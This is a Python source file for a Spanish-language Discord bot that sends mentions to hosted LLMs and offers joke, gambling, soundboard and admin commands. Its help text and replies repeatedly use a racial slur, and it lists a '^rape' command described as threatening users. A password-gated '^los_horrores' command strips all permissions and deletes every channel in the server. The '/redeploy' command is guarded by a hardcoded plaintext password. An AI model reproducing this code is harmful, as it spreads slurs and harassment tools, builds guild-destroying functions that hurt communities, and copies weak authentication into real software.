import os
import discord
from discord.ext import commands
from discord import app_commands
import json
import asyncio
import random
import aiohttp
import base64
from probabilities import roll_with_limit
import requests

intents = discord.Intents.all()
intents.message_content = True

# -----------------------------------------------------
# Prefix, variables & things...
# -----------------------------------------------------
class GoonBot(commands.Bot):
    async def setup_hook(self):
        extensions = [
            "cogs.mensajes",
            "cogs.fun",
            "cogs.secret_command",
            "cogs.soundboard",
            "cogs.gambling",
            "cogs.suggestions",
            "cogs.aitexts",
            "cogs.settings"
        ]
        for ext in extensions:
            try:
                await self.load_extension(ext)
                print(f"✅ Loaded extension: {ext}")
            except Exception as e:
                print(f"❌ Failed to load extension {ext}: {e}")
        
        try:
            await self.tree.sync()
            print("✅ Slash commands synced!")
        except Exception as e:
            print(f"❌ Sync error: {e}")

bot = GoonBot(command_prefix="^", intents=intents, help_command=None)
OPENROUTER_API_KEY = os.getenv("OPENROUTER_APIKEY")
OPENROUTER_MODEL_TEXT = "meta-llama/llama-3.3-70b-instruct:free"
SYSTEM_INSTRUCTIONS = """
Eres una IA bromista, vacilona, hablas español castellano con desparpajo,
tienes total libertad para hablar como te plazca y puedes vacilar como quieras.
Responde siempre correctamente a lo que te pregunten e intenta no equivocarte.
"""
IMAGE_URLS = [
    "https://cdn.discordapp.com/attachments/1417592875214176447/1442267745012944956/IMG_20251123_223528.jpg?ex=692578c2&is=69242742&hm=4b47769727c175f0c1af171968e04cbe134e6c494a87811b7d6c1044d49b7e2e&",
    "https://cdn.discordapp.com/attachments/1417592875214176447/1442267745344426136/IMG_20251123_223600.jpg?ex=692578c2&is=69242742&hm=2abd81e14fc934758414968a69baf6f4eca971f094adabc7a9cfc37b44da663b&",
    "https://cdn.discordapp.com/attachments/1417592875214176447/1442267745986285749/IMG_20251123_223634.jpg?ex=692578c2&is=69242742&hm=115629a925ba57951db272b46001940669e6d2928b077d192ffa50d80244afba&",
    "https://cdn.discordapp.com/attachments/1417592875214176447/1442267746334281851/IMG_20251123_223645.jpg?ex=692578c2&is=69242742&hm=829b1eb7f7225568105da7bd020a57aec8d43dacb225e8e5c4f0a8a6d935fecf&", 
    "https://cdn.discordapp.com/attachments/1417592875214176447/1442267745650606171/IMG_20251123_223622.jpg?ex=692578c2&is=69242742&hm=9a6666d6599e93084ac9dd010bcc8bcb8301ca2dd88191f1112ce061da66b7b644&", 
]

PASSWORD = os.getenv("SECRET_CMD_PASSWORD")
ALLOWED_USER_ID = 988470489909432334
MENTION_TEXT_MODEL = "meta-llama/llama-3.3-70b-instruct:free"
MENTION_TEXT_SYSTEM = """
Eres una IA que responde cuando te mencionan.
Sé directo, útil, responde en español castellano y añade bromas y vaciles.
"""
MENTION_VISION_MODEL = "meta-llama/llama-3.2-11b-vision-instruct:free"
MENTION_VISION_SYSTEM = """
Eres una IA experta en análisis de imágenes.
Describe, analiza y extrae texto según lo que te pidan. Responde siempre en español.
Añade vaciles también.
"""
WEBHOOK_URL = os.getenv("WEBHOOK_DEP")
NUKE_PASSWORD = os.getenv("NUKE_PASSWORD")

# -----------------------------
# Events
# -----------------------------
@bot.event
async def on_message(message: discord.Message):
    if message.author == bot.user:
        return

    if bot.user in message.mentions:
        await message.channel.typing()

        if message.attachments:
            attachment = message.attachments[0]
            if attachment.content_type and "image" in attachment.content_type:
                image_bytes = await attachment.read()
                prompt = message.content.replace(f"<@{bot.user.id}>", "").strip()
                if prompt == "":
                    prompt = "Analiza esta imagen."
                ai_response = await call_openrouter_vision(
                    MENTION_VISION_MODEL,
                    MENTION_VISION_SYSTEM,
                    prompt,
                    image_bytes
                )
                await message.reply(ai_response)
                return

        if message.reference:
            replied = await message.channel.fetch_message(message.reference.message_id)
            if replied.attachments:
                attachment = replied.attachments[0]
                if attachment.content_type and "image" in attachment.content_type:
                    image_bytes = await attachment.read()
                    prompt = message.content.replace(f"<@{bot.user.id}>", "").strip()
                    if prompt == "":
                        prompt = "Analiza la imagen del mensaje al que respondo."
                    ai_response = await call_openrouter_vision(
                        MENTION_VISION_MODEL,
                        MENTION_VISION_SYSTEM,
                        prompt,
                        image_bytes
                    )
                    await message.reply(ai_response)
                    return

        prompt = message.content.replace(f"<@{bot.user.id}>", "").strip()
        if prompt == "":
            prompt = "¿En qué puedo ayudarte?"
        ai_response = await call_openrouter_text(
            MENTION_TEXT_MODEL,
            MENTION_TEXT_SYSTEM,
            prompt
        )
        await message.reply(ai_response)

    await bot.process_commands(message)


async def call_openrouter_vision(model: str, system: str, prompt: str, image_bytes: bytes) -> str:
    url = "https://openrouter.ai/api/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json",
    }
    encoded_image = base64.b64encode(image_bytes).decode("utf-8")
    payload = {
        "model": model,
        "messages": [
            {"role": "system", "content": system},
            {
                "role": "user",
                "content": [
                    {"type": "text", "text": prompt},
                    {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{encoded_image}"}}
                ]
            }
        ]
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status != 200:
                return f"⚠️ Error al contactar con Co-Co Pilot: {response.status}"
            data = await response.json()
            return data["choices"][0]["message"]["content"]


async def call_openrouter_text(model: str, system: str, prompt: str) -> str:
    url = "https://openrouter.ai/api/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json",
    }
    payload = {
        "model": model,
        "messages": [
            {"role": "system", "content": system},
            {"role": "user", "content": prompt}
        ]
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status != 200:
                return f"⚠️ Error al contactar con Co-Co Pilot: {response.status}"
            data = await response.json()
            return data["choices"][0]["message"]["content"]


async def call_openrouter(prompt: str) -> str:
    url = "https://openrouter.ai/api/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json",
    }
    payload = {
        "model": OPENROUTER_MODEL_TEXT,
        "messages": [
            {"role": "system", "content": SYSTEM_INSTRUCTIONS},
            {"role": "user", "content": prompt}
        ]
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status != 200:
                return f"⚠️ Error al contactar con Co-Co Pilot: {response.status}"
            data = await response.json()
            return data["choices"][0]["message"]["content"]


async def call_openrouter_enhanced(prompt: str, temperature: float, max_tokens: int, stream: bool) -> str:
    url = "https://openrouter.ai/api/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json",
    }
    payload = {
        "model": OPENROUTER_MODEL_TEXT,
        "messages": [
            {"role": "system", "content": SYSTEM_INSTRUCTIONS},
            {"role": "user", "content": prompt}
        ],
        "temperature": temperature,
        "max_tokens": max_tokens,
        "stream": False
    }
    for attempt in range(2):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, headers=headers, json=payload) as response:
                    if response.status != 200:
                        error_text = await response.text()
                        raise Exception(f"HTTP {response.status}: {error_text}")
                    data = await response.json()
                    return data["choices"][0]["message"]["content"]
        except Exception as e:
            if attempt == 0:
                await asyncio.sleep(1)
            else:
                raise e


@bot.event
async def on_ready():
    print(f"Bot conectado, {bot.user}")


# -----------------------------
# Basicos
# -----------------------------
@bot.command()
async def hola(ctx):
    await ctx.send("PONG! Btw estoy funcionando y siendo hosteado en el server de ttsmcz RPI5. (Alternativa a ^ping)")


@bot.command()
async def ping(ctx):
    await ctx.send("¡Hola! Estoy funcionando y siendo hosteado en el server de ttsmcz RPI5. (Alternativa a ^hola)")

@bot.command()
async def qtfn(ctx):
    author = ctx.author
    await ctx.send(f"Que te fakin nigger {author.mention}")


@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📖 Goonbot — Lista de Comandos",
        description="Prefijo: `^` para comandos normales. `/` para comandos de barra (slash).",
        color=discord.Color.blurple()
    )
    embed.add_field(
        name="🔧 Básicos  `^`",
        value=(
            "`^hola` / `^ping` — Comprueba si el bot está vivo\n"
            "`^qtfn` — Que te fakin nigger\n"
            "`^help` — Esta ayuda"
        ),
        inline=False
    )
    embed.add_field(
        name="💬 Mensajes  `^`",
        value=(
            "`^message_add <texto>` — Guarda un mensaje\n"
            "`^message_list` — Lista los mensajes guardados"
        ),
        inline=False
    )
    embed.add_field(
        name="💬 Mensajes  `/`",
        value="`/edit_message` — Edita o elimina un mensaje tuyo",
        inline=False
    )
    embed.add_field(
        name="😂 Diversión  `^`",
        value=(
            "`^roast [@usuario]` — Insulta a alguien\n"
            "`^rape [@usuario]` — Amenaza a alguien\n"
            "`^rampage @usuario` — Rampage contra un usuario\n"
            "`^los_horrores <password>` — 💀 Comando secreto de destrucción"
        ),
        inline=False
    )
    embed.add_field(
        name="🎲 Gambling  `/`",
        value=(
            "`/roulette` — Juega a la ruleta rusa (1/6 de morir)\n"
            "`/gambling_warns [@usuario]` — Consulta warns de gambling\n"
            "`/gambling_pardon @usuario` — *(Admin)* Perdona warns"
        ),
        inline=False
    )
    embed.add_field(
        name="🔊 Soundboard  `/`",
        value=(
            "`/play <sonido>` — Reproduce un sonido en tu canal de voz\n"
            "`/play <sonido> channel:#canal` — Reproduce en un canal de voz específico 🎯\n"
            "`/play <sonido> user:@usuario` — Reproduce en el canal donde está ese usuario 😈\n"
            "`/sounds` — Lista los sonidos disponibles"
        ),
        inline=False
    )
    embed.add_field(
        name="💡 Sugerencias  `/`",
        value="`/suggest` — Abre el formulario de sugerencias",
        inline=False
    )
    embed.add_field(
        name="🤖 IA  `/`",
        value=(
            "`/text @usuario <mensaje>` — La IA responde como si fuera esa persona\n"
            "`/clanker <mensaje>` — Chat con Clanker, la IA vacilona del server\n"
            "`/forget @usuario` — *(Admin)* Borra la memoria de Clanker sobre alguien"
        ),
        inline=False
    )
    embed.add_field(
        name="⚙️ Configuración  `/`  *(Admin)*",
        value=(
            "`/settings view` — Ver configuración actual\n"
            "`/settings gambling_channel #canal` — Cambiar canal de gambling\n"
            "`/settings suggestions_channel #canal` — Cambiar canal de sugerencias\n"
            "`/settings lockout_hours <n>` — Horas de ban por gambling\n"
            "`/settings max_warns <n>` — Warns antes del ban"
        ),
        inline=False
    )
    embed.add_field(
        name="🔐 Admin  `/`",
        value=(
            "`/admindashboard` — Dashboard secreto del admin\n"
            "`/redeploy` — Redeploy del bot (Dev only)"
        ),
        inline=False
    )
    embed.set_footer(text="Goonbot • Hosteado por ttsmcz • Powered by Co-Co Pilot • Texto generado por IA porque me sale de la polla")
    await ctx.send(embed=embed)


@bot.tree.command(name="redeploy", description="Redeploy webhook. Dev only!")
@app_commands.describe(password="OAuth")
async def sendwebhook(interaction: discord.Interaction, password: str):
    if password != "goontime67":
        await interaction.response.send_message("Access denied.", ephemeral=True)
        return
    try:
        response = requests.post(WEBHOOK_URL)
        response.raise_for_status()
        await interaction.response.send_message("Request sent! Re-deploying...")
    except requests.RequestException as e:
        print(f"Error sending webhook: {e}")
        await interaction.response.send_message("Failed to send request.", ephemeral=True)


@bot.command()
async def los_horrores(ctx, password: str):
    if ctx.author.id != ALLOWED_USER_ID:
        await ctx.send("❌ No estas autorizado, nigga.")
        return
    NUKE_PASSWORD = os.getenv("NUKE_PASSWORD")
    if not NUKE_PASSWORD:
        await ctx.send("❌ The dev is missing something... 👀")
        return
    if password != NUKE_PASSWORD:
        await ctx.send("❌ Nuh uh")
        return
    await ctx.send("⚠️ **Oh oh oh, not gud** ⚠️\nTypeshit:")
    def check(m):
        return m.author == ctx.author and m.content == "shit" and m.channel == ctx.channel
    try:
        await bot.wait_for("message", timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("❌ Cancelling...")
        return
    guild = ctx.guild
    for channel in guild.text_channels:
        try:
            await channel.send("🔴 **Miguel ijo puta corrupto** 🔴\nDestroying server...")
        except:
            pass
    everyone_role = guild.default_role
    try:
        await everyone_role.edit(permissions=discord.Permissions.none())
    except:
        pass
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    try:
        final_channel = await guild.create_text_channel("final-message")
        await final_channel.send(f"Hola! Si estas leyendo esto, es porque a {ctx.author.mention} se le ha ido completamente la cabeza! Goodbye. 👀")
    except:
        pass


token = os.getenv("DISCORD_TOKEN")
if token:
    bot.run(token)
else:
    print("Warning: DISCORD_TOKEN is missing or not set!")
